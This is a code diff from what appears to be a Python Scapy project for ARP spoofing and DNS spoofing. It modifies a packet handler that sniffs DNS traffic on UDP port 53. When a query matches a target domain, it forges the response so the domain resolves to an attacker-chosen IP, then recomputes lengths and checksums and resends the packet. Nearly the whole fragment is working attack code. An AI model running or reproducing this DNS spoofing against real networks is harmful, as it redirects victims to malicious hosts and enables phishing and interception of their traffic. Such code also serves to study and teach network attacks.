@@ -31,7 +31,7 @@ def ARP_spoofing():
 
 # DNS-Spoof Attack
 def dns_spoof_attack():
-    packets = sniff(filter='udp port 53', count=2, prn=process_packet)
+    packets = sniff(filter='udp port 53', count=10, prn=process_packet)
     # for packet in packets:
     #     if packet.haslayer(DNS):
     #         dns_packet = packet[DNS]
@@ -50,15 +50,20 @@ def process_packet(packet):
         destination_port = udp_packet.dport
         
         # if ip_packet.dst = ipTrap:
+        # print(dns_packet.qd.name)
         if trapUrl in dns_packet.qd.qname:
-            dns_packet.show()
-            print("DNS packet with destination IP " + trapUrl + " found!")
+            # dns_packet.show()
+            print(" ------------- ")
             if (dns_packet.qr == 1):
-                print("Response Data: " + dns_packet.an.rdata)
+                print("Before: " + dns_packet.an.rdata + ', ' + dns_packet.an.rrname)
                 # dns_packet.an.rdata = ipMal
-                dns_packet.an = DNSRR(rrname=trapUrl, rdata=dns_hosts[trapUrl])
+                dns_packet.an = DNSRR(rrname=trapUrl, rdata=ipMal)
+                print("Changed address to: " + dns_packet.an.rdata + ', ' + dns_packet.an.rrname)
+                dns_packet.ancount = 1
                 del packet[IP].chksum
+                del packet[IP].len
                 del packet[UDP].chksum
+                del packet[UDP].len
                 send(packet, verbose=False)
 
             # Display complete DNS packet information
